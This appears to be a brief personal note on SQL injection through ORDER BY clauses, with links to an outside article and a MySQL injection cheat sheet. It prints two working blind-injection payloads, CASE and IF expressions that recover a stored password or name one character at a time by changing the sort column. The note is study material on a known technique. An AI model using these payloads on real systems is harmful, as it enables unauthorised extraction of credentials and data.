# sql injection

## order by

you can not use union statement after order by statements[^1], but we can use some
query as condition in order statment.

```
(CASE WHEN (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users where username = 0x61646D696E) = 65 THEN date ELSE title END)
```

or

```
$IF((SELECT ASCII(SUBSTRING(name, 1,1)) from girls_tbl where name like '%hr%')=99,regdate,name) desc
```

But these statements can only be used on selecting sorting on which column, but not on `asc` or `desc`.

## sql injection

Cheatsheet[^2]

[^1]: http://josephkeeler.com/2009/05/php-security-sql-injection-in-order-by/

[^2]: http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
